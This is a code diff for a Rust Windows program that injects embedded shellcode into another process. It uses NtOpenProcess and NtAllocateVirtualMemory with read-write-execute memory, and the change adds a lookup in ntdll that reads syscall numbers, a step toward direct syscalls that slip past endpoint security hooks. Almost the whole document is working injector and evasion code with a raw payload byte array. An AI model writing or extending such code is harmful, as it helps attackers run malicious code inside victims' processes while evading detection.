@@ -1,8 +1,15 @@
-use std::{env, ffi::c_void, ptr};
-use windows::Win32::Foundation::NTSTATUS;
-
-type HANDLE = *mut c_void;
-
+use std::{
+    env,
+    ffi::{CString, c_void},
+    ptr,
+};
+use windows::{
+    Win32::{
+        Foundation::NTSTATUS,
+        System::LibraryLoader::{GetModuleHandleA, GetProcAddress},
+    },
+    core::PCSTR,
+};
 #[repr(C)]
 #[allow(non_camel_case_types)]
 #[allow(non_snake_case)]
@@ -23,6 +30,7 @@ pub struct OBJECT_ATTRIBUTES {
     SecurityQualityOfService: *mut c_void,
 }
 
+type HANDLE = *mut c_void;
 const MEM_COMMIT: u32 = 0x1000;
 const MEM_RESERVE: u32 = 0x2000;
 const PAGE_EXECUTE_READWRITE: u32 = 0x40;
@@ -119,7 +127,7 @@ pub fn main() -> windows::core::Result<()> {
         );
         assert!(
             openprocess_status.0 == 0,
-            "NtAllocateVirtualMemory failed with NTSTATUS: 0x{:X}",
+            "NtOpenProcess failed with NTSTATUS: 0x{:X}",
             openprocess_status.0
         );
 
@@ -148,9 +156,23 @@ pub fn main() -> windows::core::Result<()> {
             0x48, 0x31, 0xc9, 0x41, 0xba, 0x45, 0x83, 0x56, 0x07, 0xff, 0xd5, 0x48, 0x31, 0xc9,
             0x41, 0xba, 0xf0, 0xb5, 0xa2, 0x56, 0xff, 0xd5,
         ];
-        let mut remote_addr: *mut c_void = std::ptr::null_mut();
+        let ntdll_name = PCSTR(b"ntdll.dll\0".as_ptr());
+        let ntdll_handle = GetModuleHandleA(ntdll_name)?;
+        let name_nt_allocate_virtual_memory = CString::new("NtAllocateVirtualMemory")
+            .expect("CString convertion failed for NtAllocateVirtualMemory");
+        let ntdll_nt_allocate_virtual_memory = GetProcAddress(
+            ntdll_handle,
+            PCSTR(name_nt_allocate_virtual_memory.as_ptr() as _),
+        )
+        .expect("GetProcAddress failed for NtAllocateVirtualMemory");
+        let addr_nt_allocate_virtual_memory = ntdll_nt_allocate_virtual_memory as *const u8;
+        let ssn_nt_allocate_virtual_memory: u8 = *addr_nt_allocate_virtual_memory.add(4);
+        println!(
+            "ssn allocate virtual memory {}",
+            *addr_nt_allocate_virtual_memory,
+        );
         let mut region_size: usize = shellcode.len() as usize;
-
+        let mut remote_addr: *mut c_void = std::ptr::null_mut();
         let allocation_status = NtAllocateVirtualMemory(
             h_process,
             &mut remote_addr as *mut *mut c_void,
